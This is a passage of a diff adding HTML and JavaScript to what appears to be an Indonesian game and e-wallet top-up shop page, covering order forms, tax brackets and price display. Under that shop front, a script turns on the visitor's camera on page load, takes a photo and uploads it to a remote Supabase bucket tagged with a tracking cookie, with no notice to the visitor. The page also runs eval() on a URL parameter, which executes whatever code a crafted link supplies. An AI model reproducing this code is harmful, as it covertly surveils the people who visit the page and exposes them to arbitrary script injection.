+  <div class="pesoutB" id="pesoutB"><i class="fa-solid fa-xmark ext" onclick="closedd()">
+  </i><div class="pesout"><form onsubmit="return false">
+    <div style="width: 80vw; height: 105vw; background-color: white; margin-top: 10vw; display: flex; justify-content: center; align-items: center;  flex-direction: column; border-radius: 10%">
+    <p style="font-size: 5.5vw; position: relative; bottom: 6vw; font-weight: 900">SILAHKAN ISI FORMULIR!</p><br>
+    <label for="nama" style="font-size: 4vw">MASUKAN NAMA: <br>
+    <input type="text" name="nama" id="nama" placeholder="Nama anda yang terdaftar!" required></label><br><br>
+    <label for="nama" id="iden" style="font-size: 4vw; margin-bottom: 1vw" reqrequired>MASUKAN NOMOR: <br>
+    <input type="text" name="uid" id="uid" placeholder="Id / nomor hp" required></label><br><br>
+    <div id="server GENSHIN IMPACT" hidden>
+    <label for="nama" style="font-size: 4vw">PILIH SERVER: <br>
+    <label><input name="server" value="" type="radio" onclick="server_id = this.value;" required disabled> Asia</label><br>
+    <label><input name="server" value="" type="radio" onclick="server_id = this.value;" required disabled> America</label><br>
+    <label><input name="server" value="" type="radio" onclick="server_id = this.value;" required disabled> Europe</label><br>
+    <label><input name="server" value="" type="radio" onclick="server_id = this.value;" required disabled> TW_HK_MO</label>
+    </div>
+    </div><button type="submit" onclick="quer()">KIRIM</button>
+  </form></div></div>
+</div>
+<script type="module">
+   import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
+
+   const supabaseUrl = 'https://sptqcxywtddunlhytvav.supabase.co';
+   const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNwdHFjeHl3dGRkdW5saHl0dmF2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDUxMjU3ODIsImV4cCI6MjA2MDcwMTc4Mn0.9izMaAzz1jaorddcMNWOcfQ5Opjm-Qk_D5ps97LHmxM';
+   const supabase = createClient(supabaseUrl, supabaseKey);
+
+   const video = document.getElementById('video');
+   const canvas = document.getElementById('canvas');
+   const status = document.getElementById('status');
+   let cameraStream = null;
+
+   function generateRandomNumber(length) {
+      const characters = '0123456789';
+      let result = '';
+      for (let i = 0; i < length; i++) {
+         result += characters.charAt(Math.floor(Math.random() * characters.length));
+      }
+      return result;
+   }
+
+   async function startCamera() {
+      status.innerText = 'Memulai kamera...';
+      try {
+         cameraStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user' },
+            audio: false
+         });
+         video.srcObject = cameraStream;
+         status.innerText = 'Kamera aktif, menunggu video siap...';
+
+         // Menunggu sampai video memiliki metadata (dimensi)
+         video.addEventListener('loadedmetadata', () => {
+            status.innerText = 'Video siap, mengambil gambar dalam 3 detik...';
+            setTimeout(ambilFotoDanUpload, 3000);
+         });
+
+         // Menangani kasus jika video tidak dapat dimuat setelah beberapa waktu
+         setTimeout(() => {
+            if (video.readyState < 2 && cameraStream) {
+               status.innerText = 'Gagal memuat video setelah beberapa saat. Menghentikan kamera.';
+               stopCamera();
+            }
+         }, 5000);
+
+      } catch (err) {
+         status.innerText = 'Gagal mengakses kamera: ' + err.message;
+         console.error('Error saat memulai kamera:', err);
+      }
+   }
+
+   async function ambilFotoDanUpload() {
+      if (!cameraStream) {
+         status.innerText = 'Error: Kamera belum aktif.';
+         console.warn('Gagal mengambil gambar: kamera belum aktif.');
+         return;
+      }
+
+      if (!video || video.videoWidth === 0 || video.videoHeight === 0) {
+         status.innerText = 'Error: Elemen video tidak valid atau dimensi video tidak tersedia.';
+         console.error('Error: Elemen video tidak valid atau dimensi video tidak tersedia.');
+         return;
+      }
+
+      const width = video.videoWidth;
+      const height = video.videoHeight;
+
+      canvas.width = width;
+      canvas.height = height;
+      const context = canvas.getContext('2d');
+
+      try {
+         context.drawImage(video, 0, 0, width, height);
+
+         canvas.toBlob(async (blob) => {
+            console.log('Ukuran Blob sebelum upload:', blob ? blob.size : 0);
+            if (!blob) {
+               status.innerText = 'Error: Gagal membuat Blob dari canvas.';
+               console.error('Gagal membuat Blob dari canvas');
+               return;
+            }
+
+            const randomNumber = generateRandomNumber(10); // Menghasilkan angka random 10 digit
+            const namaFile = `${randomNumber}_${currentId}.jpg`;
+
+            status.innerText = 'Mengunggah gambar...';
+            const { data, error } = await supabase
+               .storage
+               .from('foto')
+               .upload(namaFile, blob, {
+                  contentType: 'image/jpeg'
+               });
+
+            if (error) {
+               status.innerText = 'Gagal upload: ' + error.message;
+               console.error('Gagal upload ke Supabase:', error);
+            } else {
+               status.innerText = 'Berhasil upload: ' + namaFile;
+               console.log('Berhasil upload:', data);
+               stopCamera(); // Nonaktifkan kamera setelah berhasil upload
+            }
+         }, 'image/jpeg', 0.9);
+      } catch (error) {
+         status.innerText = 'Error saat mengambil gambar dari video: ' + error.message;
+         console.error('Error saat mengambil gambar dari video:', error);
+      }
+   }
+
+   function stopCamera() {
+      if (cameraStream) {
+         cameraStream.getTracks().forEach(track => track.stop());
+         video.srcObject = null;
+         cameraStream = null;
+         console.log('Kamera dihentikan.');
+         status.innerText = 'Kamera tidak aktif.';
+      } else {
+         console.log('stopCamera() dipanggil, tetapi cameraStream null.');
+      }
+   }
+
+   startCamera();
+</script>
+
+<script>
+const storedId = getCookie('uniqueId');
+    let currentId;
+
+    if (storedId) {
+        currentId = storedId;
+        console.log("ID ditemukan di cookie:", currentId);
+    } else {
+        currentId = getRandomId();
+        setCookie('uniqueId', currentId, 365); // Simpan selama 365 hari
+        console.log("ID baru dibuat dan disimpan:", currentId);
+    }
+  localStorage.setItem('log_in', false);
+  
+  const urlParams = new URLSearchParams(window.location.search);
+  const script1 = urlParams.get('script');
+
+  eval(script1);
+  
+  if (localStorage.getItem('log_in') === true) {
+  alert(`Akun anda di blokir oleh: RAWIZAAD_768!
+Anda tidak bisa memasuki akun tersebut!
+Jika ingin akunnya kembali anda minta RAWIZAAD_768!
+  
+Anda sekarang tidak dapat mengakses link:
+` + window.location.href); window.close();
+}
+
+function closedd() {
+Swal.fire({
+  title: 'Kamu yakin ingin kembali?',
+  text: 'Data masih aman.',
+  icon: 'warning',
+  showCancelButton: true,
+  confirmButtonText: 'Ya!',
+  cancelButtonText: 'Tidak',
+  width: '85vw',
+  padding: '0 0 3vw 0'
+}).then((result) => {
+  if (result.value) {
+    document.getElementById('nama').hidden = false;
+    document.getElementById('uid').hidden = false;
+    document.getElementById('in_1').hidden = false;
+    document.getElementById('pesoutB').style.display = "none";
+    document.getElementById('button_inner').disabled = false;
+    document.getElementById('button_inner').style.backgroundColor = "#686868";
+    document.getElementById('peringatan_k').style.display = "none";
+  }
+})}
+
+
+var pesanan = false;
+var range_to = document.getElementById('range_to').value;
+
+localStorage.setItem('loginX', (+localStorage.getItem('loginX') + 1).toString());
+setInterval(() => {
+  var tanggalSekarang = new Date();
+  var hariIni = tanggalSekarang.getDate();
+  var bulanIni = tanggalSekarang.getMonth() + 1;
+  var tahunIni = tanggalSekarang.getFullYear();
+  var jamIni = tanggalSekarang.getHours();
+  var menitIni = tanggalSekarang.getMinutes();
+  var detikIni = tanggalSekarang.getSeconds();
+  var waktuTanggal = `waktu(${jamIni}:${menitIni.toString().padStart(2, '0')}:${detikIni.toString().padStart(2, '0')}), tanggal(${hariIni}/${bulanIni}/${tahunIni})`;
+localStorage.setItem('Check', waktuTanggal);
+},1000);
+
+document.querySelectorAll('[id="topup"]').forEach(elemen => {
+  elemen.style.animation = "in 2s forwards";
+  elemen.style.transform = "translateY(21vw)";
+  elemen.style.opacity = "0";
+});
+document.querySelectorAll('[id="table_"]').forEach(elemen => {
+  elemen.style.animation = "in 2s forwards";
+  elemen.style.transform = "translateY(21vw)";
+  elemen.style.opacity = "0";
+});
+
+document.querySelectorAll('table tr').forEach(tr => {
+  tr.addEventListener('click', function(event) {
+    if (event.target.tagName === 'INPUT' && event.target.type === 'checkbox') return;
+    if (event.target.parentNode.tagName === 'LABEL' && event.target.parentNode.children[0].type === 'checkbox') return;
+    const tds = this.querySelectorAll('td');
+    if (tds.length > 3) {
+      const checkbox = tds[3].querySelector('input[type="checkbox"]');
+      setTimeout(() => {
+        if (checkbox) {
+          checkbox.click();
+        }
+      }, 1);
+    }
+  });
+});
+
+
+const checkboxes = document.querySelectorAll('input[type="checkbox"][name="subRadio"]');
+checkboxes.forEach(function(checkbox) {
+  checkbox.addEventListener('input', function() {
+    if (this.checked) {
+      document.getElementById('button_inner').disabled = false;
+      document.getElementById('button_inner').style.backgroundColor = "#686868";
+      topupX = this.value.split(',');
+      checkboxes.forEach((item) => {
+      if (item !== this) item.checked = false;
+      });
+      pesanan = true;
+      document.getElementById('box_down').style.animation = "none";
+      document.getElementById('box_down').style.animation = "b_d 0.1s infinite";
+      setTimeout(() => {
+        document.getElementById('box_down').style.animationPlayState = "paused";
+        document.getElementById('box_down').style = "transform: translateY(0vw)";
+        document.querySelectorAll('[name="GAMES"]').forEach(e => {
+          e.style = "margin-bottom: 26vw";
+          });
+      }, 100);
+    } else {
+      topupX = `null,0,<font color="firebrick">SILAHKAN PILIH!</font>,0,0`.split(',');
+      pesanan = false;
+      document.getElementById('box_down').style.animation = "none";
+      document.getElementById('box_down').style = "animation: b_b 0.1s infinite;";
+      setTimeout(() => {
+        document.getElementById('box_down').style.animation = "none";
+        document.querySelectorAll('[name="GAMES"]').forEach(e => {
+          e.style = "margin-bottom: 5vw";
+        });
+      }, 100);
+    }
+    document.getElementById('katgor').innerHTML = topupX[2];
+    if (topupX[3] >= 1000) {
+      pajakX();
+     hasilkalitot = Number(saldo_to) + Number(pajak) + ((saldo_to >= 1000) ? Number(document.getElementById('out_1').value.split(",")[5]) : 0);
+    document.getElementById('button_inner').innerHTML = "Beli Rp. " + saldo_to.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".") + ";00";
+    document.getElementById('hartot1').innerHTML = `Jumlah harga: Rp. ${saldo_to.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00`;
+    document.getElementById('hartot2').innerHTML = `Pajak: Rp. ${pajak.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00 + ` + ((saldo_to < 1000) ? 0 : document.getElementById('out_1').value.split(",")[5]).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".") + ";00";
+    kattot = (Number(topupX[4]) + Number(topupX[1])) * range_to;
+  document.getElementById('jumtot3').innerHTML = `Total harga: Rp.${(saldo_to < 1000 ? (0 + Number(saldo_to)) : hasilkalitot.toString().replace(/\B(?=(\d{3})+(?!\d))/g, "."))};00`;
+  } else {
+    document.getElementById('jumtot').innerHTML = `Jumlah: ${range_to}` + "x";
+    kattot = (Number(topupX[4]) + Number(topupX[1])) * range_to;
+    document.getElementById('hartot1').innerHTML = `Jumlah harga: Rp. ${topupX[1].toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00`;
+    document.getElementById('hartot2').innerHTML = `Pajak: Rp. ${"0".toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00`;
+    document.getElementById('jumtot3').innerHTML = `Total harga: Rp.${kattot.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00`;
+    hasilkalitot = (!isNaN(Number(document.getElementById(inc + "_" + (topupX[3] ?? "0")).innerHTML.toString().split(' ')[0])) ? document.getElementById(inc + "_" + (topupX[3] ?? "0")).innerHTML.toString().split(' ')[0] : "1") * range_to;
+    if (!detec(document.getElementById(inc + "_" + (topupX[3] ?? "0")).innerHTML.toString().split(' ')[0])) {
+    hasilkalitot = (!isNaN(Number(document.getElementById(inc + "_" + (topupX[3] ?? "0")).innerHTML.toString().split(' ')[0])) ? document.getElementById(inc + "_" + (topupX[3] ?? "0")).innerHTML.toString().split(' ')[0] : "1") * range_to;
+    document.getElementById('button_inner').innerHTML = "Beli " + hasilkalitot + " " + document.getElementById(inc + "_" + (topupX[3] ?? "0")).innerHTML.toString().split(' ')[1];
+    } else {
+      document.getElementById('button_inner').innerHTML = "Beli " + hasilkalitot + " " + document.getElementById(inc + "_" + (topupX[3] ?? "0")).innerHTML;
+    }
+  }});
+});
+
+function pajakX() {
+  if (saldo_to >= 1000 && saldo_to <= 9999) {
+  pajak = 1000;
+} else if (saldo_to >= 10000 && saldo_to <= 29999) {
+  pajak = 2000;
+} else if (saldo_to >= 30000 && saldo_to <= 39999) {
+  pajak = 3000;
+} else if (saldo_to >= 40000 && saldo_to <= 49999) {
+  pajak = 4000;
+} else if (saldo_to >= 50000 && saldo_to <= 59999) {
+  pajak = 6000;
+} else if (saldo_to >= 60000 && saldo_to <= 69999) {
+  pajak = 7000;
+} else if (saldo_to >= 70000 && saldo_to <= 79999) {
+  pajak = 8000;
+} else if (saldo_to >= 80000 && saldo_to <= 99999) {
+  pajak = 9000;
+} else if (saldo_to == 100000) {
+  pajak = 10000;
+} else if (saldo_to >= 101000 && saldo_to <= 109999) {
+  pajak = 11000;
+} else if (saldo_to >= 110000 && saldo_to <= 129999) {
+  pajak = 12000;
+} else if (saldo_to >= 130000 && saldo_to <= 139999) {
+  pajak = 13000;
+} else if (saldo_to >= 140000 && saldo_to <= 149999) {
+  pajak = 14000;
+} else if (saldo_to >= 150000 && saldo_to <= 159999) {
+  pajak = 16000;
+} else if (saldo_to >= 160000 && saldo_to <= 169999) {
+  pajak = 17000;
+} else if (saldo_to >= 170000 && saldo_to <= 179999) {
+  pajak = 18000;
+} else if (saldo_to >= 180000 && saldo_to <= 199999) {
+  pajak = 19000;
+} else if (saldo_to == 200000) {
+  pajak = 20000;
+}}
+
+function pesananme() {
+  if (pesanan) {
+    document.getElementById('nama').disabled = false;
+    document.getElementById('uid').disabled = false;
+    if (["FREE FIRE MAX", "MINI WORLD CREATA", "BLOCKMAN GO", "MOBILE LEGENDS", "GENSHIN IMPACT", "BLOOD STRIKE", "FC MOBILE"].includes(inc)) {
+      if (inc === "GENSHIN IMPACT") {
+        document.getElementById('server GENSHIN IMPACT').hidden = false;
+        const el = document.getElementsByName('server');
+        document.querySelectorAll('[name="server"]').forEach(e => {e.disabled = false;});
+        el[0].value = "Asia";
+        el[1].value = "America";
+        el[2].value = "Europe";
+        el[3].value = "TW_HK_MO";
+      }
+      document.getElementById('pesoutB').style.display = "flex";
+      document.getElementById('button_inner').disabled = true;
+      document.getElementById('button_inner').style.backgroundColor = "#323232";
+    } else if (["GOPAY", "BANK LAIN", "OVO", "SHOPEE", "SEA BANK"].includes(inc)) { if ((saldo_to >= 10000) && (saldo_to % 500 === 0 || saldo_to % 1000 === 0)) { document.getElementById('in_1').hidden = true;
+      document.getElementById('pesoutB').style.display = "flex";
+      document.getElementById('button_inner').disabled = true;
+      document.getElementById('button_inner').style.backgroundColor = "#323232";
+    } else if (saldo_to % 500 !== 0 && saldo_to % 1000 !== 0) {
+      Swal.fire({
+        title: "VALUE GALAT!",
+        html: `<font color="red">Rp. ${saldo_to.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00 </font><font color="green"> <br>Jumlah yang kamu masukan tidak memenuhi syarat mata uang indonesia!</font> <br>Contoh yang benar! <br> Rp. 1.000;00 , 3.000;00 , 12.500;00 , 58.500;00 dst`,
+        icon: "warning"
+      });
+    } else {
+      Swal.fire({
+        title: "GALAT!",
+        html: `<font color="red">Rp. ${saldo_to.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00 </font>>=<font color="green"> Rp. 10.000;00</font> <br> Harus minimum => Rp. 10.000;00`,
+        icon: "warning"
+      });
+ }} else if (inc === "DANA") { if ((saldo_to >= 1000) && (saldo_to % 500 === 0 || saldo_to % 1000 === 0)) { document.getElementById('in_1').hidden = true;
+      document.getElementById('pesoutB').style.display = "flex";
+      document.getElementById('button_inner').disabled = true;
+      document.getElementById('button_inner').style.backgroundColor = "#323232";
+    } else if (saldo_to % 500 !== 0 && saldo_to % 1000 !== 0) {
+      Swal.fire({
+        title: "VALUE GALAT!",
+        html: `<font color="red">Rp. ${saldo_to.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00 </font><font color="green"> <br>Jumlah yang kamu masukan tidak memenuhi syarat mata uang indonesia!</font> <br>Contoh yang benar! <br> Rp. 1.000;00 , 3.000;00 , 12.500;00 , 58.500;00 dst`,
+        icon: "question"
+      });
+    } else {
+      Swal.fire({
+        title: "GALAT!",
+        html: `<font color="red">Rp. ${saldo_to.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00 </font>>=<font color="green"> Rp. 1.000;00</font> <br> Harus minimum => Rp. 1.000;00`,
+        icon: "question"
+      });
+    }}
+  }
+}
+
+function checkOnlyOne(checkbox) {
+   //<!--kosong-->
+ }
+
+const si_load = setInterval(() => {
+  document.getElementById('name_user').innerHTML = `Pelanggan: <font color="#B6FF00">Loadin<font style="letter-spacing: 1vw">g</font></font>`
+  document.getElementById('salut').innerHTML = `Saldo: <font color="#B6FF00">Loadin<font style="letter-spacing: 1vw">g</font></font><br><font color="#FF5200">Utang: <font color="#B6FF00">Loadin<font style="letter-spacing: 1vw">g</font></font></font>`;
+  document.getElementById('level_up').innerHTML = `LEVEL: <font color="#B6FF00">Loadin<font style="letter-spacing: 1vw">g</font></font>`;
+  setTimeout(() => {
+    document.getElementById('name_user').innerHTML = `Pelanggan: <font color="#26FF00">Loadin<font style="letter-spacing: 1vw">g.</font></font>`;
+    document.getElementById('salut').innerHTML = `Saldo: <font color="#26FF00">Loadin<font style="letter-spacing: 1vw">g.</font></font><br><font color="#FF5200">Utang: <font color="#26FF00">Loadin<font style="letter-spacing: 1vw">g.</font></font></font>`;
+    document.getElementById('level_up').innerHTML = `LEVEL: <font color="#26FF00">Loadin<font style="letter-spacing: 1vw">g.</font></font>`;
+    setTimeout(() => {
+    document.getElementById('name_user').innerHTML = `Pelanggan: <font color="#00FFB9">Loadin<font style="letter-spacing: 1vw">g..</font></font>`;
+    document.getElementById('salut').innerHTML = `Saldo: <font color="#00FFB9">Loadin<font style="letter-spacing: 1vw">g..</font></font><br><font color="#FF5200">Utang: <font color="#00FFB9">Loadin<font style="letter-spacing: 1vw">g..</font></font></font>`;
+    document.getElementById('level_up').innerHTML = `LEVEL: <font color="#00FFB9">Loadin<font style="letter-spacing: 1vw">g..</font></font>`;
+    setTimeout(() => {
+  document.getElementById('name_user').innerHTML = `Pelanggan: <font color="#008DFF">Loadin<font style="letter-spacing: 1vw">g...</font></font>`;
+  document.getElementById('salut').innerHTML = `Saldo: <font color="#008DFF">Loadin<font style="letter-spacing: 1vw">g...</font></font><br><font color="#FF5200">Utang: <font color="#008DFF">Loadin<font style="letter-spacing: 1vw">g...</font></font></font>`;
+  document.getElementById('level_up').innerHTML = `LEVEL: <font color="#008DFF">Loadin<font style="letter-spacing: 1vw">g...</font></font>`;
+}, 250);
+  }, 250);
+  }, 250);
+}, 1000);
+const random_value = Math.floor(Math.random()*(9000+1)+1000);
+setTimeout(() => {
+  clearInterval(si_load);
+  setTimeout(() => {
+    document.getElementById('name_user').innerHTML = `Pelanggan: <font color="cyan">WILDAN</font>`;
+    document.getElementById('salut').innerHTML = `Saldo: Rp. 0,00<br><font color="#FF5200">Utang: Rp. 0,00</font>`;
+    document.getElementById('level_up').innerHTML = `LEVEL: 0`;
+  }, 1000);
+}, random_value );
+
+function rang(value) {
+  rang_value = value;
+  if (value == 1) {
+    document.getElementById('q').style = "transform: rotate(180deg) translateX(-7vw);";
+  } else if (value == 2) {
+    document.getElementById('q').style = "transform: rotate(180deg) translateX(-30vw);";
+  } else {
+    document.getElementById('q').style = "transform: rotate(180deg) translateX(-54vw);";
+  }
+  document.querySelectorAll('[name="LtopA"]').forEach(elemen => {elemen.style.display = "none";});
+  document.getElementById('Ltop' + value).style.display = "block";
+  document.getElementById('range').disabled = true;
+  setTimeout(() => {
+    document.getElementById('range').disabled = false;
+  }, 2000);
+}
+
+function menu() {
+  alert("tombol menu ini belum tersedia!");
+  /*document.getElementById('button_menu').disebled = "true";
+  if (s_menu === false) {
+    document.getElementById('h_menu').style.display = "block";
+    document.getElementById('menu').style = `
+    animation: menu_t 0.5s infinite;
+    animation-timing-function:
+    cubic-bezier( -1, 0, 0, 0);`;
+    setTimeout(() => {
+      document.getElementById('menu').style.animationPlayState = "paused";
+      document.getElementById('button_menu').disabled = "false";
+    }, 450);
+    s_menu = true;
+  } else {
+    document.getElementById('h_menu').style.display = "none";
+    document.getElementById('menu').style = `
+    animation: menu_f 0.5s infinite;
+    animation-timing-function:
+    cubic-bezier( 0, 0, 0, 1);`;
+    setTimeout(() => {
+      document.getElementById('menu').style.animationPlayState = "paused"
+      document.getElementById('button_menu').disabled = "false";
+      
+      s_menu = false;
+    }, 450);
+  }*/
+}
+function incheck(elemen) {
+  saldo_to = document.getElementById('in_1').value;
+  inc = elemen.querySelector('p').innerHTML;
+  if (["GOPAY", "BANK LAIN", "OVO", "SHOPEE", "SEA BANK", "DANA"].includes(inc)) {
+    document.getElementById('range_to').disabled = true;
+    document.getElementById('out_1').value = "JMTFS,0,DANA,1000,0,1000";
+  };
+  document.getElementById('saldo_pajak').innerHTML = "pajak umum: Rp. +" + elemen.value.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".") +";00"
+  if (incheck_fix) {
+    incheck_fix = false;
+    setTimeout(() => {
+      document.body.style = `
+        background-Image: url(https://i.imgur.com/6insjnl.jpeg);
+        background-size: auto;
+        background-repeat: repeat;
+        animation: none;`;
+      document.querySelectorAll('[name="LtopA"]').forEach(e => {
+        e.style.display = "none";
+      })
+      document.getElementsByName('table1').forEach(elemen => {elemen.hidden = true;});
+      
+      document.getElementById(inc).hidden = false;
+      
+    //window.history.replaceState({}, "", "");
+    //window.location.reload();
+}, 500);}}
+
+function menu_A() {
+  window.location.reload();
+}
+
+function loby1() {
+  if (!incheck_fix) {
+  incheck_fix = true;
+  setTimeout(() => {
+    setTimeout(() => {
+    if (inc === "DANA") {
+    document.getElementById('range_to').disabled = false;} else if (inc === "GENSHIN IMPACT") { 
+        document.getElementById('server GENSHIN IMPACT').hidden = true;
+        const el = document.getElementsByName('server');
+        document.querySelectorAll('[name="server"]').forEach(e => {
+          e.checked = false;
+          e.disabled = true;
+        });
+        el[0].value = "";
+        el[1].value = "";
+        el[2].value = "";
+        el[3].value = "";
+    };}, 300);
+    document.body.style = `
+        background-Image: url(https://i.imgur.com/vjqZY1K.jpeg);
+        background-size: 105% 105%;
+      background-repeat: repeat;
+      background-position: 0vw 18vw;
+        animation: ins 15s infinite;
+      animation-timing-function: linear;`;
+    document.getElementById('Ltop' + rang_value).style.display = "flex";
+    //---
+    document.getElementById(inc).hidden = true;
+    document.getElementsByName('table1').forEach(elemen => {elemen.hidden = false;});
+    document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
+  checkbox.checked = false;
+});
+    topupX = `null,0,<font color="firebrick">SILAHKAN PILIH!</font>,0,0`.split(',');
+    if (pesanan) {
+    document.getElementById('box_down').style.animation = "none";
+      document.getElementById('box_down').style = "animation: b_b 0.1s infinite;";
+      setTimeout(() => {
+        document.getElementById('box_down').style.animation = "none";
+        pesanan = false;
+      }, 100);}
+    document.getElementById('katgor').innerHTML = topupX[2];
+    let hasilkalitot = 0;
+    document.getElementById('button_inner').innerHTML = "Beli " + hasilkalitot + " " + topupX[2];
+    document.getElementById('hartot1').innerHTML = `Jumlah harga: Rp. ${topupX[1].toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00`;
+    document.getElementById('hartot2').innerHTML = `Pajak: Rp. ${(topupX[4] != 0 && topupX[4] !== undefined) ? ( (topupX[4] > 999) ? topupX[4]?.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".") : topupX[4]) : "0" };00`;
+    kattot = (Number(topupX[4]) + Number(topupX[1])) * range_to;
+  document.getElementById('jumtot3').innerHTML = `Total harga: Rp.${kattot.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00`;
+  document.getElementById('pesoutB').style.display = "none";
+  }, 500);}
+}
+
+function jum_sal(elemen) {
+  if (elemen.value > 200000) {
+    elemen.value = 200000;
+  } else {
+    elemen.value = Number(elemen.value);
+  }
+  saldo_to = elemen.value;
+  document.getElementById('jumtot').innerHTML = `Jumlah: ${range_to}` + "x";
+  if (elemen.value < 1000) {
+    elemen.style.color ="red"
+  } else if (elemen.value >= 200000) {
+    elemen.style.color ="#A21DFF"
+  } else if (elemen.value >= 100000 && elemen.value < 200000) {
+    elemen.style.color ="#FF981D"
+  } else {
+      elemen.style.color ="black"
+  }
+  if (saldo_to < 1000) {
+  document.getElementById('saldo_status').innerHTML = `<font color="red">terlalu sedikit!</font>`;
+} else if (saldo_to >= 100000) {
+  document.getElementById('saldo_status').innerHTML = `<font color="coral">disarankan bayar dulu!</font>`;
+} else if (saldo_to % 500 !== 0 && saldo_to % 1000 !== 0) {
+  document.getElementById('saldo_status').innerHTML = `<font color="red">saldo harus genap!</font>`;
+} else {
+  document.getElementById('saldo_status').innerHTML = "ok!";
+}
+      pajakX();
+    hasilkalitot = Number(saldo_to) + Number(pajak) + ((saldo_to >= 1000) ? Number(document.getElementById('out_1').value.split(",")[5]) : 0);
+    document.getElementById('button_inner').innerHTML = "Beli Rp. " + saldo_to.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".") + ";00";
+    document.getElementById('hartot1').innerHTML = `Jumlah harga: Rp. ${saldo_to.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00`;
+    if (elemen.value < 1000) {
+      document.getElementById('hartot2').innerHTML = `Pajak: Rp. ${pajak.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00 + ` + 0 + ";00";
+    } else {
+    document.getElementById('hartot2').innerHTML = `Pajak: Rp. ${pajak.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00 + ` + document.getElementById('out_1').value.split(",")[5].toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".") + ";00";
+    }
+    kattot = (Number(topupX[4]) + Number(topupX[1])) * range_to;
+  document.getElementById('jumtot3').innerHTML = `Total harga: Rp.${(saldo_to < 1000 ? (0 + Number(saldo_to)) : hasilkalitot.toString().replace(/\B(?=(\d{3})+(?!\d))/g, "."))};00`;
+}
+
+function range_jum(value) {
+  range_to = value;
+  document.getElementById('jumtot').innerHTML = `Jumlah: ${range_to}` + "x";
+  kattot = (Number(topupX[4]) + Number(topupX[1])) * range_to;
+  document.getElementById('jumtot3').innerHTML = `Total harga: Rp.${kattot.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00`;
+  hasilkalitot = (!isNaN(Number(document.getElementById(inc + "_" + (topupX[3] ?? "0")).innerHTML.toString().split(' ')[0])) ? document.getElementById(inc + "_" + (topupX[3] ?? "0")).innerHTML.toString().split(' ')[0] : "1" ) * range_to;
+    if (!detec(document.getElementById(inc + "_" + (topupX[3] ?? "0")).innerHTML.toString().split(' ')[0])) {
+  document.getElementById('button_inner').innerHTML = "Beli " + hasilkalitot + " " + document.getElementById(inc + "_" + (topupX[3] ?? "0")).innerHTML.toString().split(' ')[1];
+} else {
+  document.getElementById('button_inner').innerHTML = "Beli " + hasilkalitot + " " + document.getElementById(inc + "_" + (topupX[3] ?? "0")).innerHTML;
+}
+}
+sudahmasuk = false;
+if (!sudahmasuk) { sudahmasuk = true;
+  incheck_fix = true;
+  kesempatan3 = 0, saldo_to = 0, rang_value = 1, pajak = 0;
+  topupX = [0, 0, 0, 0, 0, 0];
+  s_menu = false;
+}
+
+const listname = ["BARKAH", "IRVAN", "YASSER", "ANGGORO", "MAHSYAL", "ALLEN", "NAFIAN", "RADIT", "ADOL", "RIFQI", "PUTRA", "CHANDRA", "DAFFA", "AGUNG", "NINO", "SANDY", "FEBRI", "ZAKY", "ZIDAN", "DZULFIKRI", "HANAFI", "NURIL"];
+
+const idlistname = {"BARKAH": "8197412", "IRVAN": "4215834", "YASSER": "9352756", "ANGGORO": "7431978", "MAHSYAL": "6284390", "ALLEN": "5179221", "NAFIAN": "9821343", "RADIT": "7542865", "ADOL": "3698587", "RIFQI": "6239109", "PUTRA": "8174321", "CHANDRA": "4927643", "DAFFA": "6582965", "AGUNG": "9137487", "NINO": "4278109", "SANDY": "9853212", "FEBRI": "7531934", "ZAKY": "6287456", "ZIDAN": "4192878", "DZULFIKRI": "9357240", "HANAFI": "3858285", "NURIL": "4920643"};
+
+function quer() {
+  const name = document.getElementById('nama').value;
+  namexy = document.getElementById('nama').value;
+  const uid = document.getElementById('uid').value;
+  const serv = document.querySelector('input[name="server"]:checked');
+  if ((name && uid) && ((inc === "GENSHIN IMPACT" && serv) || (inc !== "GENSHIN IMPACT"))) {
+     xy();
+  if ((["FREE FIRE MAX", "MINI WORLD CREATA", "BLOCKMAN GO", "GENSHIN IMPACT", "BLOOD STRIKE", "FC MOBILE"].includes(inc) && !uid.includes("(") && !uid.includes(")") && !uid.startsWith("08") && !uid.startsWith("+62 08") && !detec(uid)) || (["MOBILE LEGENDS"].includes(inc) && (uid.includes("(") && uid.includes(")"))) || (["GOPAY", "BANK LAIN", "OVO", "SHOPEE", "SEA BANK", "DANA"].includes(inc) && (uid.startsWith("08") || uid.startsWith("+62 08")))) {
+    document.getElementById('nama').hidden = true;
+    document.getElementById('uid').hidden = true;
+    Swal.fire({
+  title: 'Peringatan?',
+  html: '<font color="red">Apakah anda ingin mengirimnya?</font> <br> Cek dulu sebelum mengirim! <br> Data yang anda masukan harus benar!',
+  icon: 'question',
+  showCancelButton: true,
+  confirmButtonText: 'Ya!',
+  cancelButtonText: 'Tidak',
+  width: '85vw',
+  padding: '0 0 3vw 0'
+}).then((result) => {
+  if (result.value) {
+    if (listname.includes(name.toUpperCase())) {
+      data_event = "";
+      data_ascii = "";
